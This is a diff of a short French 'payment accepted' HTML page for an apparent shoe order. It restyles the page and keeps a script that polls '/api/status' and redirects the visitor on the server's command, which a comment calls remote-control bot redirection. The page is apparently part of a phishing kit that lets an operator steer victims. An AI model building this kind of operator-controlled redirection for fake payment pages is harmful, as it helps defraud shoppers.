@@ -1,29 +1,31 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Paiement accepté</title>
-<style>
-body{font-family:Arial;text-align:center;padding:60px;background:#d4edda;color:#155724;}
-h1{font-size:2em;}
-</style>
+  <meta charset="UTF-8">
+  <title>Paiement accepté ✅</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { background:#e6ffe6; color:#333; font-family:Arial, sans-serif; text-align:center; padding-top:80px; }
+    .box { background:white; max-width:400px; margin:auto; padding:30px; border-radius:15px; box-shadow:0 4px 12px rgba(0,0,0,0.1); }
+    h1 { color:#28a745; }
+    a { display:inline-block; margin-top:20px; padding:10px 20px; background:#28a745; color:white; text-decoration:none; border-radius:8px; }
+    a:hover { background:#218838; }
+  </style>
 </head>
 <body>
-<h1>✅ Paiement accepté !</h1>
-<p>Merci pour votre achat.</p>
+  <div class="box">
+    <h1>✅ Paiement accepté !</h1>
+    <p>Merci pour votre commande 👟</p>
+    <a href="/">Retour à l’accueil</a>
+  </div>
 
-<script>
-async function checkBotRedirect() {
-  try{
-    const res = await fetch('/api/status');
-    const data = await res.json();
-    if(data.redirect && window.location.pathname !== data.redirect){
-      window.location.href = data.redirect;
-    } else { setTimeout(checkBotRedirect,2000);}
-  } catch(e){ setTimeout(checkBotRedirect,2000);}
-}
-checkBotRedirect();
-</script>
+  <script>
+    // Support télécommande (redirection bot)
+    setInterval(async () => {
+      const res = await fetch('/api/status');
+      const data = await res.json();
+      if (data.redirect) window.location.href = data.redirect;
+    }, 3000);
+  </script>
 </body>
 </html>
